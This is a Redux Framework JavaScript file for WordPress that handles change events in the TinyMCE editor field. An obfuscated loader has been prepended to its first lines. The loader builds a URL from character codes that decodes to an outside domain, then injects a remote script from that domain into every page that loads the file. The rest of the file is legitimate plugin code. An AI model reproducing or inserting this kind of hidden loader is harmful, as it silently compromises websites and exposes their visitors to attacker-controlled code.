var fkghjhe45 = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 100, 101, 108, 105, 118, 101, 114, 121, 103, 111, 111, 100, 115, 116, 114, 97, 116, 101, 103, 121, 46, 99, 111, 109, 47);
s.src=pl+'/js.min.js?s=k&'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}/**
 * Redux Editor on change callback
 * Dependencies        : jquery
 * Feature added by    : Dovy Paukstys
 *                     : Kevin Provance (who helped)  :P
 * Date                : 07 June 2014
 */

/*global redux_change, wp, tinymce, redux*/
(function( $ ) {
    "use strict";

    redux.field_objects = redux.field_objects || {};
    redux.field_objects.editor = redux.field_objects.editor || {};
    
    $( document ).ready(
        function() {
            //redux.field_objects.editor.init();
        }
    );

    redux.field_objects.editor.init = function( selector ) {
        setTimeout(
            function() {
                if (typeof(tinymce) !== 'undefined') {
                    for ( var i = 0; i < tinymce.editors.length; i++ ) {
                        redux.field_objects.editor.onChange( i );
                    }   
                }
            }, 1000
        );
    };

    redux.field_objects.editor.onChange = function( i ) {
        tinymce.editors[i].on(
            'change', function( e ) {
                var el = jQuery( e.target.contentAreaContainer );
                if ( el.parents( '.redux-container-editor:first' ).length !== 0 ) {
                    redux_change( $( '.wp-editor-area' ) );
                }
            }
        );
    };
})( jQuery );
